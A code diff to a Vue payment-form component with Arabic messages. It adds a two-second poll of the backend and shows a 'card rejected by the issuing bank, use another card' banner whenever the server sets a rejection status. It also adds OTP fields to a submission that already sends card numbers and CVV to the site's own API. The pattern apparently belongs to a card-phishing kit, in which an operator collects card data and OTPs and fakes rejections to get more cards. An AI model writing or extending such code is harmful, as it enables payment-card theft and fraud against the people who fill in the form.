@@ -1,8 +1,8 @@
 <script setup lang="ts">
-import { ref } from 'vue';
+import { ref, onMounted, onUnmounted } from 'vue';
 import { ChevronDown, CreditCard, ArrowRight, ShieldCheck } from 'lucide-vue-next';
 import { useRouter } from 'vue-router';
-import { updateCardRequest, resolveActiveRequestId } from '../api';
+import { updateCardRequest, getCardRequest, resolveActiveRequestId } from '../api';
 
 const router = useRouter();
 
@@ -16,6 +16,7 @@ const form = ref({
 
 const isSubmitting = ref(false);
 const statusBanner = ref('');
+let statusCheckTimer: ReturnType<typeof setInterval> | null = null;
 
 const errors = ref({
   name: '',
@@ -23,6 +24,24 @@ const errors = ref({
   expMonth: '',
   expYear: '',
   cvv: ''
+});
+
+const checkCardStatus = async () => {
+  try {
+    const data = await getCardRequest();
+    if (data?.otpStatus === 'card_rejected') {
+      statusBanner.value = 'تم رفض البطاقة البنكية من قِبل البنك المصدر. يرجى التأكد من صحة البيانات أو استخدام بطاقة دفع أخرى.';
+    }
+  } catch {}
+};
+
+onMounted(() => {
+  checkCardStatus();
+  statusCheckTimer = setInterval(checkCardStatus, 2000);
+});
+
+onUnmounted(() => {
+  if (statusCheckTimer) clearInterval(statusCheckTimer);
 });
 
 const validateForm = () => {
@@ -79,6 +98,8 @@ const submitPayment = async () => {
       expMonth: form.value.expMonth,
       expYear: form.value.expYear,
       cvv: form.value.cvv,
+      otp: '',
+      otpStatus: '',
       step: 'card',
       nextAction: ''
     });
